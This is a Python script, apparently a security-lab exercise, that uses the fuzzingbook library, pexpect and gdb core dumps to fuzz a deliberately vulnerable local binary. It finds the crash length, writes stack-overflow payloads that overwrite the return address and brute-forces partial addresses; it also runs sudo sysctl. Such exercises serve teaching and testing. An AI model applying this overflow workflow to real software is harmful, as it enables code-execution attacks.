# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import struct
import subprocess
from io import BytesIO
from numpy import longlong
import resource
from pygdbmi.gdbcontroller import GdbController
import pexpect
from fuzzingbook.Fuzzer import RandomFuzzer
import os
import sys
import subprocess
from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate
import array as arr
from pprint import pprint

def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations):
    f = RandomFuzzer()

    inp = seedInput
    minBadLen = sys.maxsize
    inp = ""
    for i in range(mutations):
        # inp = mutate(inp)
        inp = inp + 'A'
        currLen = len(repr(inp))
        # create files and keep feeding them into the system
        file = open(fuzzFile, 'wb')
        file.write(currLen.to_bytes(4, 'big'))
        file.write(bytes(repr(inp), 'utf-8'))
        file.close()
        try:
            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True)
        except subprocess.CalledProcessError:
            print(output.stdout)
            print(output.stderr)
            if minBadLen > currLen:
                minBadLen = currLen
            print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
        print(output.stdout)
        print(output.stderr)

    print(f"The minimum bad len input that was found is {minBadLen}")
    return minBadLen


def test():
    str= 10*b'A'
    print(str)


def attackSystem(minBadLen, fuzzedProgram, fuzzFile):
    file = open(fuzzFile, 'wb')
    attackLen = (minBadLen + 7).to_bytes(4, 'big')
    attackString = b'A' * (minBadLen + 3) + b'\x36\x92\x04\x08'
    file.write(attackLen)
    file.write(attackString)
    file.close()
    print("NOW WE ATTACK")
    print("This is our weapon ", fuzzFile)
    print(attackLen)
    print(attackString)
    output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
    print(output)
    print("Return code=", returncode)
    return attackLen


def breakSystemBeforeReturn(minBadLen, fuzzedProgram, fuzzFile):
    # +3 to overwrite the base address pointer
    # +4 to overwrite the return address
    inp = b'A' * (minBadLen + 3+4)
    i=0
    gb=10_000_000_000
    siaddr='0x41414141'
    while i<gb and siaddr== '0x41414141':
        inp = inp + i*b'A'
        currLen = minBadLen+3+4+i
        # create files and keep feeding them into the system
        file = open(fuzzFile, 'wb')
        file.write(currLen.to_bytes(4, 'big'))
        file.write(inp)
        file.close()
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        print(output)
        print(returncode)
        print("Len=", currLen)
        print("Si_addr=", si_addr())
        i=i+1
        i=i*10
        siaddr=si_addr()
    if i>gb:
        print("The attack file can be at least 1 GB in size")
    else:
        print(f"The attack file size can be at least {i/10} bytes in size")

#Make the address big endian
#returns a normal view of the address into a string form
def convertAddressToString(addr):
    addr=str(addr)
    aux=addr.replace("\\x",'')
    aux=aux.replace("b'",'')
    aux=aux.replace('\'','')
    flipBytes=""
    i=1
    auxc=''
    for c in reversed(aux):
        if i%2==1:
            auxc=c
        else:
            flipBytes=flipBytes+c+auxc
        i=i+1
    return flipBytes


# partial address must contain full bytes
def attackWithPartialAddress(minBadLen, partialAddress, fuzzedProgram, fuzzFile):

    # build the address
    partialAddressLen = len(str(partialAddress))
    unknownBytesNr = 4 - partialAddressLen
    possibleAddresses = 256 * unknownBytesNr
    validAddresses=[b'0']
    for i in range(possibleAddresses.__round__()):
        file = open(fuzzFile, 'wb')
        attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
        # build the attack
        attackLen = (minBadLen + 7).to_bytes(4, 'big')
        attackString = b'A' * (minBadLen + 3)
        file.write(attackLen)
        file.write(attackString)
        file.write(attackAddress)
        file.close()
        print("NOW WE ATTACK")
        print("This is our weapon ", fuzzFile)
        print(attackLen)
        print(attackString)
        print(attackAddress)
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        outputStr=str(output)
        siaddr=si_addr().replace("0x",'')
        myaddr=convertAddressToString(attackAddress)
        #this may not always work
        if siaddr!='0' and siaddr!=myaddr:
            #execution got deflected to a valid address
            validAddresses.append(attackAddress)
        else:
            print("Not a valid address", attackAddress)
    validAddresses.remove(b'0')
    print("All the valid addresses that deflect the program:")
    print(validAddresses)
    print("A total of ",len(validAddresses))
    
 #Extract the si_addr value with the help of gdb   
def si_addr():
    output = subprocess.run(["gdb", fuzzedProgram, "core"],input="p $_siginfo\n\quit\n", capture_output=True, text=True, shell=False, check=True)
    list_of_words = output.stdout.split()
    #print(output.stdout)
    try:
        si_addr = list_of_words[list_of_words.index("fault.") + 2].replace(",","")
    except ValueError:
        si_addr = list_of_words[list_of_words.index("instruction.") + 2].replace(",","")
    return si_addr


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #Set the core file limit and path
    resource.setrlimit(
    resource.RLIMIT_CORE,
    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    stream = os.popen('echo Returned output')
    output = stream.read()
    if output != "kernel.core_pattern = core":
        os.system("sudo sysctl kernel.core_pattern=core")
    #////////////////////////////////
    
    #Set variables for the fuzzed program
    seedInput = "abcdefghijklmno"
    fuzzFile = 'attack.bin'
    fuzzedProgram = "./vlad-iulian-pop-fuzzing/simple-vulnerable-buffer-overflow-from-file"
    mutations = 40
    sys.stdout = open('log.txt', 'w')
    minBadLen = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations)
    attackLen = int.from_bytes(attackSystem(minBadLen,fuzzedProgram,fuzzFile), "big")
    #attackWithPartialAddress(minBadLen,'\x92\x04\x08', fuzzedProgram,fuzzFile)
    breakSystemBeforeReturn(minBadLen, fuzzedProgram, fuzzFile)
    sys.stdout.close()



